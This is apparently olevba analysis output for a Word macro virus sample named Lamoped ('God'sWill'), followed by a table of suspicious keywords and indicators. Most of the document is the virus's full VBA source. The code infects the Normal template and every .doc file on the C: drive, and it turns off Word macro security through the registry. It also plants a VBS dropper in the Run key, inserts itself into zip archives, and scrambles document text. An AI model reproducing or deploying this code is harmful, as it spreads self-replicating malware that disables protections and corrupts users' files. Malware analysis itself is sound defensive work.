olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lamoped-78751c8f486140b2f56e9a3602a251e33d01370a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Lamoped-78751c8f486140b2f56e9a3602a251e33d01370a 
in file: Virus.MSWord.Lamoped-78751c8f486140b2f56e9a3602a251e33d01370a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub main()
'w97.God'sWill
'coded by a.v_killer
On Error Resume Next
n$ = DefaultDir$(2) + "\NORMAL.DOT"
f$ = FileName$()
If GetAttr(n$) < 32 Then GoTo del
A = CountMacros(0)
If A > 0 Then
    For b = 1 To A
        If MacroName$(b, 0) = "FileSave" Then c = 1
    Next b
End If

If c <> 1 Then
Organizer .Copy, .Source = f$, .Destination = n$, .Name = "AutoOpen", .Tab = 3
Organizer .Copy, .Source = f$, .Destination = n$, .Name = "FileSave", .Tab = 3

End If

aa = CountMacros(1)
If aa > 0 Then
    For bb = 1 To aa
        If MacroName$(bb, 1) = "FileSave" Then CC = 1
    Next bb
End If

If CC <> 1 Then
    FileSaveAs .Format = 1
    fm$ = FileName$() + ":AutoOpen"
    MacroCopy "AutoOpen", fm$
    fm$ = FileName$() + ":FileSave"
    MacroCopy "FileSave", fm$

End If
End Sub
Private Sub Stealth()
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
End Select
WordBasic.DisableAutoMacros 0
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "
ActiveDocument.ReadOnlyRecommended = False
If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
Set STM4849 = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set CNT1899 = ActiveDocument.VBProject.VBComponents(1).CodeModule
HCT5343 = "C:\God'sWill.FSR"
Open HCT5343 For Output As #1
Print #1, VBProject.VBComponents(1).CodeModule.Lines(1, 120)
Close #1
If STM4849.CountOfLines < 5 Then
    STM4849.DeleteLines 1, STM4849.CountOfLines: STM4849.AddFromFile HCT5343
End If
If CNT1899.CountOfLines < 5 Then
    CNT1899.DeleteLines 1, CNT1899.CountOfLines: CNT1899.AddFromFile HCT5343
    ActiveDocument.Save
End If
Kill HCT5343
Open "C:\Windows\God'sWill.drv" For Output As #1
Print #1, ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 120)
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "WVE") = "C:\Windows\God'sWill.vbs"
Open "C:\Windows\God'sWill.vbs" For Output As #1
Print #1, "' God'sWill.vbs for God'sWill Virus by A.v_killer"
Print #1, "On Error Resume Next"
Print #1, "Dim WSHShell"
Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM"", 1, ""REG_DWORD"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level"", 1, ""REG_DWORD"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level"", 1, ""REG_DWORD"""
Print #1, "Set Backup = WScript.CreateObject(""Word.Application"")"
Print #1, "Backup.Options.VirusProtection = False"
Print #1, "Backup.Options.SaveNormalPrompt = False"
Print #1, "For x = 1 To Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (""C:\Windows\God'sWill.drv"")"
Print #1, "Set Search = Backup.Application.Filesearch"
Print #1, "Search.LookIn = ""C:\"": Search.SearchSubFolders = True: Search.FileName = ""*.doc"": Search.Execute"
Print #1, "For f = 1 To Search.FoundFiles.Count"
Print #1, "Victim = Search.FoundFiles(f)"
Print #1, "Backup.Documents.Open Victim"
Print #1, "For x = 1 To Backup.ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "Backup.ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "Backup.ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (""C:\Windows\God'sWill.drv"")"
Print #1, "Backup.ActiveDocument.Save"
Print #1, "Backup.ActiveDocument.Close"
Print #1, "Next"
Print #1, "Backup.Application.Quit"
Close #1
Call CDC6818
End Sub
Private Sub CDC6818()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "InfectWinZip") <> "True" Then
AJO2528 = Dir("C:\Windows\Confidential.doc")
If AJO2528 = "" Then ActiveDocument.SaveAs "C:\Windows\God'sWill.doc"
If AJO2528 <> "" Then
WinZipPath = Application.System.PrivateProfileString("", _
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
"\CurrentVersion\App Paths\winzip32.exe", "")
With Application.FileSearch
.LookIn = "C:\"
.SearchSubFolders = True
.FileName = "*.zip"
.Execute
End With
For f = 1 To Application.FileSearch.FoundFiles.Count
QBG8250 = Application.FileSearch.FoundFiles(f)
VBA.Shell WinZipPath & " -a -r " & QBG8250 _
 & Chr(32) & "C:\Windows\God'sWill.doc", vbHide
Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "InfectWinZip") = "True"
End If
End If
Call Erh787
End Sub
Private Sub Erh787()
On Error GoTo Fin
Selection.WholeStory
A$ = Selection
For a_ = 1 To Len(A$) Step 2
b$ = b$ + Mid(A$, a_ + 1, 1)
b$ = b$ + Mid(A$, a_, 1)
Next
Selection.TypeText Text:=b$
Selection.Range.Delete
Selection.HomeKey Unit:=wdStory, Extend:=wdMove
Fin:
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |sWill.vbs           |Executable file name                         |
|IOC       |winzip32.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

